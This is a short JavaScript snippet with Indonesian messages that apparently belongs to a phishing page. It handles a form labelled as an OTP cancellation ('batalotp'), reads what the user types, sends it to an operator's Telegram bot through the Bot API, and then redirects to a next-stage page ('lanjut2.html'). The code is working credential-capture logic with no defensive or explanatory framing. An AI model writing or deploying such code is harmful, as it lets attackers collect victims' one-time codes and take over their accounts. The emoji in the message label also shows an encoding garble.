<script>
  document.getElementById("batalotp").addEventListener("submit", function (e) {
    e.preventDefault(); // Hapus perilaku default form

    const pesan = document.getElementById("batalID").value.trim();

    if (!pesan) {
      alert("Silakan masukkan pesan terlebih dahulu.");
      return;
    }

    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
    const data = {
      chat_id: CHAT_ID,
      text: `ðŸ“© Pesan Pembatalan 1:\n${pesan}`
    };

    fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data)
    })
    .then(res => res.json())
    .then(res => {
      if (res.ok) {
        window.location.href = "lanjut2.html";
      } else {
        alert("Gagal mengirim pesan.");
      }
    })
    .catch(err => {
      console.error("Error:", err);
      alert("Terjadi kesalahan.");
    });
  });
